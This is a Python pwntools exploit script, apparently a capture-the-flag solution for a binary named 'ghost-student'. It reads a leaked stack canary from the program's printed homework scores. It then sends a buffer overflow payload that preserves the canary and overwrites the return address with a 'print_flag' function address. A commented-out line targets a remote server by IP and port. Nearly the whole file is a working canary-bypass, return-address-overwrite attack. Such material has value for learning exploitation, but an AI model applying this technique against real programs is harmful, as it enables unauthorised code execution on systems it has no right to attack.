# This code works (2024-5-16)

from pwn import *

# context.log_level = 'debug'

p = process('./ghost-student')
# p = remote('141.164.48.98', '30003')

p.recvuntil(b'>>>')
p.sendline(b'2')

p.recvuntil(b'>>>')
p.sendline(b'7')

p.recvuntil(b'HW7\n')
scores = p.recvuntil(b'\n')
nums = list(map(int, scores.split()))
print(scores)
print(nums)
canary = (nums[3] << 32) + nums[2]
print(hex(canary))

p.recvuntil(b'>>>')
p.sendline(b'3')

p.recvuntil(b'>>>')
p.sendline(b'6')

p.recvuntil(b'>>>')

print_flag = 0x401374.to_bytes(8, 'little')
payload = b''
payload += b'A' * 16
payload += canary.to_bytes(8, 'little')
payload += b'A' * 24
payload += print_flag
payload += print_flag
payload += print_flag

# pause()
p.sendline(payload)

# p.recvuntil(b'>>>')
# p.sendline(b'0')

# payload += b'A' * 0x14  # 0x14?
# payload += addr.to_bytes(4, 'little')



# p.sendline(payload)




p.interactive()


# payload = b'B' * (0x30)
# payload +=
